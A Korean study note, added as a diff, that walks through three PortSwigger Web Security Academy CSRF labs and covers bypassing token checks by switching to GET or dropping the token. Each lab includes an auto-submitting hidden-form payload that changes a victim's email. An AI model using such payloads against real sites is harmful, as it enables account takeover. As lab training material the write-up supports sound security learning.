@@ -1,0 +1,57 @@
+form의 url은 portswigger의 랩 아이디
+
+1) Lab: CSRF vulnerability with no defenses
+> 이메일 변경 시키기
+
+1. 게시글 보기, 주어진 계정으로 로그인하기
+
+2. CSRF 실습을 위한 portswigger의 서비스 사용
+> lab에 접속 후, 상단의 Go to exploit server으로 접속
+body부분에 코드 삽입 후, Store클릭
+<form method="POST" action="https://0ac50071039854d080de030d006f007c.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="qw@as">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+3. View exploit로 확인 및 Deliver exploit to victim으로 공격
+
+(처음 써보는 exploit server라 아직 모르겠음)
+
+
+2) Lab: CSRF where token validation depends on request method
+> 토큰 검사 CSRF
+
+1. 주어진 계정 로그인 및 이메일 변경
+
+2. 재변경요청으로 CSRF토큰 값 임의로 수정
+> 토큰 값이 달라 실패
+
+3. 변경 요청을 GET방식으로 변경
+> 리피터로 POST에서 GET방식으로 변경하니 되는 것을 확인
+
+4. Go to exploit server으로 요청
+<form action="https://0a8700f70373642c83aa23940010006a.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="qw@as">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+
+3) Lab: CSRF where token validation depends on token being present
+> 토큰 검증 CSRF
+
+1. 주어진 계정 로그인 및 이메일 변경
+
+2. 재변경요청으로 CSRF토큰 값 임의로 수정
+> 토큰 값이 달라 실패, CSRF 토큰 삭제는 성공
+
+4. Go to exploit server으로 요청
+<form method="POST" action="https://0a84004d03e9756a803f8592000e00ba.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="qw@as">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
